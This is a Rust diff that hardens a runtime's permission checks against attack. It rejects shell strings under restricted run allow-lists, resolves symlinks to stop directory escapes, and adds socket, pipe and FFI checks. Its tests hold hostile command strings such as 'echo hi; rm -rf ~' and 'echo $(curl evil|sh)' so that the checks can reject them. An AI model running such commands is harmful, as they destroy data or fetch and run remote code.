@@ -121,14 +121,60 @@ impl Permissions {
             })
     }
 
-    /// Checks whether spawning subprocess `cmd` is permitted.
-    pub fn check_run(&self, cmd: &str) -> Result<(), String> {
-        check_run_scope(&self.run, cmd)
+    /// Checks whether spawning a shell command string (`sh -c` / `cmd /C`) is permitted.
+    ///
+    /// When `--allow-run` is restricted to an allow-list, shell strings are rejected
+    /// outright to prevent metacharacter/command-chaining bypasses; callers must use
+    /// the array form `{ program, arg1, ... }` instead.
+    pub fn check_run_shell(&self, cmd: &str) -> Result<(), String> {
+        match &self.run {
+            PermissionScope::AllowAll => Ok(()),
+            PermissionScope::DenyAll => Err(format!(
+                "permission denied: subprocess execution of '{}', run with --allow-run",
+                cmd
+            )),
+            PermissionScope::AllowList(_) => Err(format!(
+                "permission denied: shell command string '{}' cannot be used with a restricted --allow-run allow-list; pass an array {{ program, arg1, ... }} instead",
+                cmd
+            )),
+        }
+    }
+
+    /// Checks whether spawning subprocess `program` (without shell interpolation) is permitted.
+    pub fn check_run(&self, program: &str) -> Result<(), String> {
+        check_run_scope(&self.run, program)
             .then_some(())
             .ok_or_else(|| {
                 format!(
                     "permission denied: subprocess execution of '{}', run with --allow-run",
-                    cmd
+                    program
+                )
+            })
+    }
+
+    /// Checks whether connecting to a Unix domain socket at `path` is permitted.
+    pub fn check_net_unix(&self, path: &str) -> Result<(), String> {
+        check_unix_socket_scope(&self.net, path)
+            .then_some(())
+            .ok_or_else(|| {
+                format!(
+                    "permission denied: unix socket access to '{}', run with --allow-net",
+                    path
+                )
+            })
+    }
+
+    /// Checks whether connecting to a named pipe (or Unix socket on non-Windows) is permitted.
+    pub fn check_net_pipe(&self, name: &str) -> Result<(), String> {
+        if !cfg!(windows) {
+            return self.check_net_unix(name);
+        }
+        check_pipe_scope(&self.net, name)
+            .then_some(())
+            .ok_or_else(|| {
+                format!(
+                    "permission denied: named pipe access to '{}', run with --allow-net",
+                    name
                 )
             })
     }
@@ -156,12 +202,22 @@ impl Permissions {
                 )
             })
     }
+
+    /// Checks whether in-process FFI memory helpers (`ffi.alloc`, `free`, `read`, `write`)
+    /// are permitted. Any non-`DenyAll` FFI policy (`AllowAll` or an explicit library
+    /// allow-list) permits these memory operations.
+    pub fn check_ffi_memory(&self) -> Result<(), String> {
+        match &self.ffi {
+            PermissionScope::AllowAll | PermissionScope::AllowList(_) => Ok(()),
+            PermissionScope::DenyAll => {
+                Err("permission denied: FFI memory operations, run with --allow-ffi".to_string())
+            }
+        }
+    }
 }
 
-/// Normalizes a path lexically against `current_dir` so `..` segments cannot
-/// escape an allowed directory prefix, even when the target does not exist yet.
-fn normalize_abs(raw: &str) -> PathBuf {
-    let p = Path::new(raw);
+/// Normalizes a path lexically against `current_dir` without touching the filesystem.
+fn normalize_abs_lexical(p: &Path) -> PathBuf {
     let abs = if p.is_absolute() {
         p.to_path_buf()
     } else if let Ok(cwd) = std::env::current_dir() {
@@ -187,15 +243,72 @@ fn normalize_abs(raw: &str) -> PathBuf {
     out
 }
 
+/// Resolves symlinks along existing path prefixes so symlink traversal inside an
+/// allow-listed directory cannot escape outside it, even when the final leaf
+/// does not exist yet.
+fn resolve_path(raw: &str) -> PathBuf {
+    resolve_path_depth(Path::new(raw), 0)
+}
+
+fn resolve_path_depth(p: &Path, depth: u8) -> PathBuf {
+    let abs = if p.is_absolute() {
+        p.to_path_buf()
+    } else if let Ok(cwd) = std::env::current_dir() {
+        cwd.join(p)
+    } else {
+        p.to_path_buf()
+    };
+
+    let mut cur = PathBuf::new();
+    for comp in abs.components() {
+        match comp {
+            Component::Prefix(_) | Component::RootDir => cur.push(comp),
+            Component::CurDir => {}
+            Component::ParentDir => {
+                if !matches!(
+                    cur.components().next_back(),
+                    Some(Component::RootDir | Component::Prefix(_))
+                ) {
+                    cur.pop();
+                }
+            }
+            Component::Normal(seg) => {
+                cur.push(seg);
+                if let Ok(meta) = std::fs::symlink_metadata(&cur) {
+                    if let Ok(canon) = std::fs::canonicalize(&cur) {
+                        cur = canon;
+                    } else if meta.file_type().is_symlink()
+                        && depth < 16
+                        && let Ok(target) = std::fs::read_link(&cur)
+                    {
+                        let base = cur.parent().unwrap_or_else(|| Path::new("/"));
+                        let joined = if target.is_absolute() {
+                            target
+                        } else {
+                            base.join(target)
+                        };
+                        cur = resolve_path_depth(&joined, depth + 1);
+                    }
+                }
+            }
+        }
+    }
+    if cur.as_os_str().is_empty() {
+        normalize_abs_lexical(p)
+    } else {
+        cur
+    }
+}
+
 fn check_path_scope(scope: &PermissionScope, target: &str) -> bool {
     match scope {
         PermissionScope::AllowAll => true,
         PermissionScope::DenyAll => false,
         PermissionScope::AllowList(allowed) => {
-            let target_norm = normalize_abs(target);
+            let target_resolved = resolve_path(target);
             allowed.iter().any(|prefix| {
-                let prefix_norm = normalize_abs(prefix);
-                target_norm.starts_with(&prefix_norm)
+                let prefix_resolved = resolve_path(prefix);
+                target_resolved.starts_with(&prefix_resolved)
             })
         }
     }
@@ -252,21 +365,61 @@ fn check_net_scope(scope: &PermissionScope, target: &str) -> bool {
     }
 }
 
-fn check_run_scope(scope: &PermissionScope, cmd: &str) -> bool {
+fn is_path_spec(s: &str) -> bool {
+    s.contains('/') || s.contains('\\') || Path::new(s).is_absolute()
+}
+
+fn check_unix_socket_scope(scope: &PermissionScope, path: &str) -> bool {
     match scope {
         PermissionScope::AllowAll => true,
         PermissionScope::DenyAll => false,
         PermissionScope::AllowList(allowed) => {
-            // For shell command strings like `echo hi` or `/bin/ls -la`, take the executable token.
-            let exe = cmd.split_whitespace().next().unwrap_or(cmd);
-            let exe_name = Path::new(exe)
-                .file_name()
-                .and_then(|n| n.to_str())
-                .unwrap_or(exe);
+            let target_resolved = resolve_path(path);
+            allowed.iter().any(|rule| {
+                if let Some(socket_rule) = rule.strip_prefix("unix:") {
+                    resolve_path(socket_rule) == target_resolved
+                } else {
+                    is_path_spec(rule) && resolve_path(rule) == target_resolved
+                }
+            })
+        }
+    }
+}
+
+fn check_pipe_scope(scope: &PermissionScope, name: &str) -> bool {
+    match scope {
+        PermissionScope::AllowAll => true,
+        PermissionScope::DenyAll => false,
+        PermissionScope::AllowList(allowed) => allowed.iter().any(|rule| {
+            let rule_name = rule.strip_prefix("pipe:").unwrap_or(rule);
+            if cfg!(windows) {
+                rule_name.eq_ignore_ascii_case(name)
+            } else {
+                rule_name == name
+            }
+        }),
+    }
+}
+
+fn check_run_scope(scope: &PermissionScope, program: &str) -> bool {
+    match scope {
+        PermissionScope::AllowAll => true,
+        PermissionScope::DenyAll => false,
+        PermissionScope::AllowList(allowed) => {
+            if program.is_empty() {
+                return false;
+            }
+            let prog_is_path = is_path_spec(program);
             allowed.iter().any(|item| {
-                item == exe
-                    || item == exe_name
-                    || Path::new(item).file_name().and_then(|n| n.to_str()) == Some(exe_name)
+                if is_path_spec(item) {
+                    prog_is_path && resolve_path(program) == resolve_path(item)
+                } else if prog_is_path {
+                    false
+                } else if cfg!(windows) {
+                    item.eq_ignore_ascii_case(program)
+                } else {
+                    item == program
+                }
             })
         }
     }
@@ -326,11 +479,83 @@ mod tests {
     #[test]
     fn test_run_and_env_allow_lists() {
         let perms = Permissions::deny_all()
-            .with_run(PermissionScope::AllowList(vec!["echo".into()]))
+            .with_run(PermissionScope::AllowList(vec![
+                "echo".into(),
+                "/usr/bin/git".into(),
+            ]))
             .with_env(PermissionScope::AllowList(vec!["PATH".into()]));
-        assert!(perms.check_run("echo hello").is_ok());
-        assert!(perms.check_run("rm -rf /").is_err());
+
+        // Array-form direct binary allowed; shell strings & path spoofing rejected.
+        assert!(perms.check_run("echo").is_ok());
+        assert!(perms.check_run_shell("echo hello").is_err());
+        assert!(perms.check_run_shell("echo hi; rm -rf ~").is_err());
+        assert!(perms.check_run_shell("echo $(curl evil|sh)").is_err());
+        assert!(perms.check_run_shell("echo x | sh").is_err());
+        assert!(perms.check_run("/tmp/evil/echo").is_err());
+
+        // Path allow-list entry matches canonical full path only, not basename.
+        assert!(perms.check_run("/usr/bin/git").is_ok());
+        assert!(perms.check_run("/tmp/evil/git").is_err());
+        assert!(perms.check_run("git").is_err());
+        assert!(perms.check_run("rm").is_err());
+
         assert!(perms.check_env("PATH").is_ok());
         assert!(perms.check_env("SECRET_KEY").is_err());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn test_read_allow_list_blocks_symlink_escape() {
+        let base = std::env::temp_dir().join(format!("neyuki_sym_test_{}", std::process::id()));
+        let safe_dir = base.join("safe");
+        let outside_dir = base.join("outside");
+        let _ = std::fs::remove_dir_all(&base);
+        std::fs::create_dir_all(&safe_dir).unwrap();
+        std::fs::create_dir_all(&outside_dir).unwrap();
+        let secret = outside_dir.join("secret.txt");
+        std::fs::write(&secret, b"top-secret").unwrap();
+
+        let escape_link = safe_dir.join("link_out");
+        std::os::unix::fs::symlink(&outside_dir, &escape_link).unwrap();
+
+        let perms = Permissions::deny_all().with_read(PermissionScope::AllowList(vec![
+            safe_dir.to_string_lossy().into_owned(),
+        ]));
+        assert!(
+            perms
+                .check_read(&safe_dir.join("normal.txt").to_string_lossy())
+                .is_ok()
+        );
+        assert!(
+            perms
+                .check_read(&escape_link.join("secret.txt").to_string_lossy())
+                .is_err()
+        );
+        assert!(
+            perms
+                .check_read(&escape_link.join("nonexistent_new.txt").to_string_lossy())
+                .is_err()
+        );
+
+        let _ = std::fs::remove_dir_all(&base);
+    }
+
+    #[test]
+    fn test_ffi_memory_scope_and_non_host_net_targets() {
+        let ffi_perms = Permissions::deny_all()
+            .with_ffi(PermissionScope::AllowList(vec!["/opt/lib/demo.so".into()]));
+        assert!(ffi_perms.check_ffi("/opt/lib/demo.so").is_ok());
+        assert!(ffi_perms.check_ffi("/tmp/evil.so").is_err());
+        assert!(ffi_perms.check_ffi_memory().is_ok());
+
+        let denied = Permissions::deny_all();
+        assert!(denied.check_ffi_memory().is_err());
+
+        let net_perms = Permissions::deny_all().with_net(PermissionScope::AllowList(vec![
+            "api.example.com".into(),
+            "unix:/tmp/allowed.sock".into(),
+        ]));
+        assert!(net_perms.check_net_unix("/tmp/allowed.sock").is_ok());
+        assert!(net_perms.check_net_unix("/tmp/other.sock").is_err());
     }
 }
